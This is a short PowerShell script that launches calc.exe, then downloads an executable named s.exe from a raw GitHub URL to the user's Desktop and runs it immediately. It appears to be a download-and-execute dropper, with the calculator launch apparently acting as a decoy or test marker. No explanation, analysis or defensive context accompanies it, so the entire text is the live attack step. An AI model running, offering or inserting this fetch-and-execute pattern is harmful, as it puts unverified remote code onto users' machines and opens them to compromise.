Start-Process "calc.exe"
$exePath="$env:USERPROFILE\Desktop\s.exe"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe" -OutFile $exePath; Start-Process $exePath
